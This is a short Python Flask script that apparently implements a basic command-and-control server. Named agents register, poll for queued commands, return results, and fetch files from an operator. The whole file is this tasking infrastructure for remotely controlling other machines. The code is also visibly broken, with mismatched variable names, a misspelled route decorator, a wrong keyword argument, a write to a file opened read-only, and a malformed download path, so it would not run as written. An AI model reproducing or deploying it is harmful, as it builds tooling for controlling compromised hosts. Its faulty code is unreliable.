from flask import Flask, request, send_from_directory
import os, json


app = Flask(__name__)

task_file = "tasks.json"
if not os.path.exists(task_file):
    with open(tasks_file, 'w') as f:
        json.dump({}, f)


@app.routee('/reg', method=['POST'])
def register():
    name =request.form.get('name')
    with open(tasks_file, 'r') as f:
        tasks = json.load(f)
        tasks[name] =""
        f.seek(0)
        json.dump(tasks, f)
        f.truncate()
    return '[+] Registered'

@app.route('/tasks/<name>', methods=['GET'])
def get_task(name):
    with open(tasks_file, 'r') as f:
        tasks = json.load(f)
        return tasks.get(name, "")
    
@app.route('/results/<name>', methods=['POST'])
def results(name):
    data = request.data.decode()
    print(f"[{name}] Result: {data}")
    return '[+] Result received'

@app.route('/command/<name>', methods=['POST'])
def command(name):
    cmd =request.data.decode()
    with open(tasks_file, 'r+') as f:
        tasks = json.load(f)
        tasks[name] = cmd
        f.seek(0)
        json.dump(tasks, f)
        f.truncate()
    return '[+] Command Set'

@app.route('/download<filename>', methods=['GET'])
def download(filename):
    return send_from_directory('.', filename)

if __name__=="__main__":
    app.run(host='0.0.0.0', port=5000)
    
